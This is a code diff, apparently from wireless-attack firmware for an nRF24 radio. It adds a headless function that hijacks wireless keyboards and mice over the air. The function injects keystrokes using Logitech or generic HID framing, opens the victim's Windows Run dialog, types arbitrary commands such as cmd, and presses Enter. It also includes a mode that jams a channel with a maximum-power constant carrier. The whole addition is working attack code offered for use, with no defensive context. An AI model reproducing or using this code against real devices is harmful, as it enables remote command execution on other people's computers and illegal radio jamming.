@@ -872,6 +872,69 @@ void nrf_sweep_jam(int startCh, int stopCh, int step, int dwellMs, bool noise) {
     sweepJamInternal(startCh, stopCh, step, dwellMs, noise);
 }
 
+// Headless HID hijack/inject for the serial+companion CLI (no device UI). Reuses
+// the in-file injection helpers. action: type|run|calc|cmd|jam. For "jam" the
+// address is ignored (constant carrier on the channel for `arg` seconds).
+bool nrf_hijack_inject(const String &addrHex, int channelIn, const String &action,
+                       const String &arg, bool logitech) {
+    if (!nrf_start()) {
+        if (serialDevice) serialDevice->println("[NRF] radio init failed");
+        return false;
+    }
+    uint8_t channel = clampChan(channelIn);
+
+    if (action == "jam") {
+        int secs = arg.length() ? arg.toInt() : 3;
+        if (secs < 1) secs = 1;
+        if (secs > 30) secs = 30;
+        NRFradio.stopListening();
+        NRFradio.setChannel(channel);
+        NRFradio.startConstCarrier(RF24_PA_MAX, channel);
+        unsigned long end = millis() + (unsigned long)secs * 1000;
+        while (millis() < end) delay(20);
+        NRFradio.stopConstCarrier();
+        if (serialDevice) serialDevice->printf("[NRF] carrier jam ch=%u %ds done\n", channel, secs);
+        return true;
+    }
+
+    uint8_t addr[5];
+    if (!parseAddr(addrHex, addr)) {
+        if (serialDevice) serialDevice->println("[NRF] bad addr (need 10 hex chars)");
+        return false;
+    }
+    InjectionProtocol proto = logitech ? PROTO_LOGITECH : PROTO_GENERIC_HID;
+    configureTx(channel, addr);
+
+    auto typeString = [&](const String &s) {
+        for (size_t i = 0; i < s.length(); ++i) {
+            uint8_t mod, key;
+            if (!asciiToHid(s[i], mod, key)) continue;
+            sendKeystroke(mod, key, proto);
+            delay(12);
+        }
+    };
+    auto runCmd = [&](const String &line) {
+        sendKeystroke(0x08, 0x15, proto); // GUI + R (open Run dialog)
+        delay(400);
+        typeString(line);
+        delay(120);
+        sendKeystroke(0x00, 0x28, proto); // Enter
+    };
+
+    if (action == "type") typeString(arg);
+    else if (action == "run") runCmd(arg);
+    else if (action == "calc") runCmd("calc");
+    else if (action == "cmd") runCmd("cmd");
+    else {
+        if (serialDevice) serialDevice->printf("[NRF] unknown action %s\n", action.c_str());
+        return false;
+    }
+    if (serialDevice)
+        serialDevice->printf("[NRF] inject %s -> %s ch=%u proto=%s ok\n", action.c_str(),
+                             addrToString(addr).c_str(), channel, logitech ? "logi" : "hid");
+    return true;
+}
+
 void nrf_toolkit() { nrf_hijack(); }
 
 void nrf_mousejack() {
